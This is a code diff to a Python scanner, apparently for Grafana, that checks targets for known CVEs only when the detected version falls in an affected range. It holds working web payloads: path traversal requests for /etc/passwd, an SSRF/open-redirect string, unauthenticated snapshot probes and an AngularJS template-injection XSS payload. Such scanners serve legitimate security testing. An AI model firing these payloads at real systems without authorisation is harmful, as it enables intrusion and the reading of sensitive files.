@@ -708,9 +708,15 @@ async def check_information_disclosure(target_url):
     
     return vulnerabilities
 
-async def check_additional_cves(target_url):
+async def check_additional_cves(target_url, version_info=None):
     """Check for additional CVEs from the pentesting guide."""
     vulnerabilities = []
+    
+    # Skip CVE testing if no version info available
+    if not version_info or not version_info.get('number'):
+        return vulnerabilities
+    
+    current_version = version_info.get('number', 'Unknown')
     
     # Test CVE-2022-39307 - User enumeration via password reset
     try:
@@ -731,84 +737,92 @@ async def check_additional_cves(target_url):
         pass
     
     # Test CVE-2021-43798 - Path traversal (enhanced payload)
-    try:
-        async with httpx.AsyncClient(timeout=10, verify=False) as client:
-            traversal_paths = [
-                "/public/plugins/alertlist/../../../../../../../../../../../../../../../../../../../etc/passwd",
-                "/public/plugins/text/../../../../../../../../../../../../../../../../../../../etc/passwd",
-                "/public/plugins/graph/../../../../../../../../../../../../../../../../../../../etc/passwd"
-            ]
-            
-            for path in traversal_paths:
-                response = await client.get(f"{target_url}{path}", timeout=5)
-                if response.status_code == 200:
-                    content = response.text
-                    if any(indicator in content for indicator in ["root:", "/bin/", "/usr/", "daemon:"]):
-                        vulnerabilities.append({
-                            "status": "VULNERABLE",
-                            "vulnerability": "CVE-2021-43798 - Path traversal file access",
-                            "target": f"{target_url}{path}",
-                            "details": "Path traversal successful. Sensitive file (/etc/passwd) accessed without authentication."
-                        })
-                        break
-    except:
-        pass
+    # Only affects versions >=8.0.0,<8.0.7, >=8.1.0,<8.1.8, >=8.2.0,<8.2.7, >=8.3.0,<8.3.1
+    if is_version_affected(current_version, [">=8.0.0,<8.0.7", ">=8.1.0,<8.1.8", ">=8.2.0,<8.2.7", ">=8.3.0,<8.3.1"]):
+        try:
+            async with httpx.AsyncClient(timeout=10, verify=False) as client:
+                traversal_paths = [
+                    "/public/plugins/alertlist/../../../../../../../../../../../../../../../../../../../etc/passwd",
+                    "/public/plugins/text/../../../../../../../../../../../../../../../../../../../etc/passwd",
+                    "/public/plugins/graph/../../../../../../../../../../../../../../../../../../../etc/passwd"
+                ]
+                
+                for path in traversal_paths:
+                    response = await client.get(f"{target_url}{path}", timeout=5)
+                    if response.status_code == 200:
+                        content = response.text
+                        if any(indicator in content for indicator in ["root:", "/bin/", "/usr/", "daemon:"]):
+                            vulnerabilities.append({
+                                "status": "VULNERABLE",
+                                "vulnerability": "CVE-2021-43798 - Path traversal file access",
+                                "target": f"{target_url}{path}",
+                                "details": f"Path traversal successful. Sensitive file (/etc/passwd) accessed without authentication. Version {current_version} is vulnerable."
+                            })
+                            break
+        except:
+            pass
     
-    # Test CVE-2020-13379 - SSRF via avatar endpoint
-    try:
-        async with httpx.AsyncClient(timeout=10, verify=False) as client:
-            ssrf_payload = "/avatar/test%3fd%3dredirect.example.com%25253f%253b%252fbp.blogspot.com%252ftest"
-            response = await client.get(f"{target_url}{ssrf_payload}", timeout=5, follow_redirects=False)
-            if response.status_code in [302, 301] and response.headers.get('location'):
-                vulnerabilities.append({
-                    "status": "VULNERABLE",
-                    "vulnerability": "CVE-2020-13379 - SSRF via avatar endpoint",
-                    "target": f"{target_url}{ssrf_payload}",
-                    "details": "SSRF vulnerability confirmed. Open redirect in avatar endpoint can be chained for SSRF attacks."
-                })
-    except:
-        pass
-    
-    # Test CVE-2022-32276 - Unauthenticated snapshot access
-    try:
-        async with httpx.AsyncClient(timeout=10, verify=False) as client:
-            snapshot_urls = [
-                "/dashboard/snapshot/test?orgId=0",
-                "/api/snapshots/1",
-                "/api/snapshots/test"
-            ]
-            
-            for url in snapshot_urls:
-                response = await client.get(f"{target_url}{url}", timeout=5)
-                if response.status_code == 200:
-                    content = response.text.lower()
-                    if "dashboard" in content or "snapshot" in content:
-                        vulnerabilities.append({
-                            "status": "VULNERABLE",
-                            "vulnerability": "CVE-2022-32276 - Unauthenticated snapshot access",
-                            "target": f"{target_url}{url}",
-                            "details": "Unauthenticated access to dashboard snapshots via orgId=0 parameter."
-                        })
-                        break
-    except:
-        pass
-    
-    # Test for XSS vulnerabilities in snapshot endpoints
-    try:
-        async with httpx.AsyncClient(timeout=10, verify=False) as client:
-            xss_payload = "/dashboard/snapshot/%7B%7Bconstructor.constructor(%27alert(document.domain)%27)()%7D%7D?orgId=1"
-            response = await client.get(f"{target_url}{xss_payload}", timeout=5)
-            if response.status_code == 200:
-                content = response.text
-                if "constructor" in content or "alert" in content:
+    # Test CVE-2020-13379 - SSRF via avatar endpoint  
+    # Only affects versions >=3.0.1,<7.0.1
+    if is_version_affected(current_version, [">=3.0.1,<7.0.1"]):
+        try:
+            async with httpx.AsyncClient(timeout=10, verify=False) as client:
+                ssrf_payload = "/avatar/test%3fd%3dredirect.example.com%25253f%253b%252fbp.blogspot.com%252ftest"
+                response = await client.get(f"{target_url}{ssrf_payload}", timeout=5, follow_redirects=False)
+                if response.status_code in [302, 301] and response.headers.get('location'):
                     vulnerabilities.append({
                         "status": "VULNERABLE",
-                        "vulnerability": "CVE-2021-41174 - AngularJS XSS in snapshot",
-                        "target": f"{target_url}{xss_payload}",
-                        "details": "XSS vulnerability in dashboard snapshot endpoint via AngularJS template injection."
+                        "vulnerability": "CVE-2020-13379 - SSRF via avatar endpoint",
+                        "target": f"{target_url}{ssrf_payload}",
+                        "details": f"SSRF vulnerability confirmed. Open redirect in avatar endpoint can be chained for SSRF attacks. Version {current_version} is vulnerable."
                     })
-    except:
-        pass
+        except:
+            pass
+    
+    # Test CVE-2022-32276 - Unauthenticated snapshot access
+    # Only affects versions >=8.4.0,<8.4.4
+    if is_version_affected(current_version, [">=8.4.0,<8.4.4"]):
+        try:
+            async with httpx.AsyncClient(timeout=10, verify=False) as client:
+                snapshot_urls = [
+                    "/dashboard/snapshot/test?orgId=0",
+                    "/api/snapshots/1",
+                    "/api/snapshots/test"
+                ]
+                
+                for url in snapshot_urls:
+                    response = await client.get(f"{target_url}{url}", timeout=5)
+                    if response.status_code == 200:
+                        content = response.text.lower()
+                        if "dashboard" in content or "snapshot" in content:
+                            vulnerabilities.append({
+                                "status": "VULNERABLE",
+                                "vulnerability": "CVE-2022-32276 - Unauthenticated snapshot access",
+                                "target": f"{target_url}{url}",
+                                "details": f"Unauthenticated access to dashboard snapshots via orgId=0 parameter. Version {current_version} is vulnerable."
+                            })
+                            break
+        except:
+            pass
+    
+    # Test CVE-2021-41174 - AngularJS XSS in snapshot endpoints
+    # Only affects versions >=8.0.0,<8.2.7 and >=8.3.0,<8.3.1
+    if is_version_affected(current_version, [">=8.0.0,<8.2.7", ">=8.3.0,<8.3.1"]):
+        try:
+            async with httpx.AsyncClient(timeout=10, verify=False) as client:
+                xss_payload = "/dashboard/snapshot/%7B%7Bconstructor.constructor(%27alert(document.domain)%27)()%7D%7D?orgId=1"
+                response = await client.get(f"{target_url}{xss_payload}", timeout=5)
+                if response.status_code == 200:
+                    content = response.text
+                    if "constructor" in content or "alert" in content:
+                        vulnerabilities.append({
+                            "status": "VULNERABLE",
+                            "vulnerability": "CVE-2021-41174 - AngularJS XSS in snapshot",
+                            "target": f"{target_url}{xss_payload}",
+                            "details": f"XSS vulnerability in dashboard snapshot endpoint via AngularJS template injection. Version {current_version} is vulnerable."
+                        })
+        except:
+            pass
     
     return vulnerabilities
 
@@ -835,7 +849,7 @@ async def run_scans(ip, port):
             check_default_credentials(target_url),
             check_unauthenticated_access(target_url),
             check_information_disclosure(target_url),
-            check_additional_cves(target_url)
+            check_additional_cves(target_url, version_info)
         ]
         check_results = await asyncio.gather(*tasks)
         
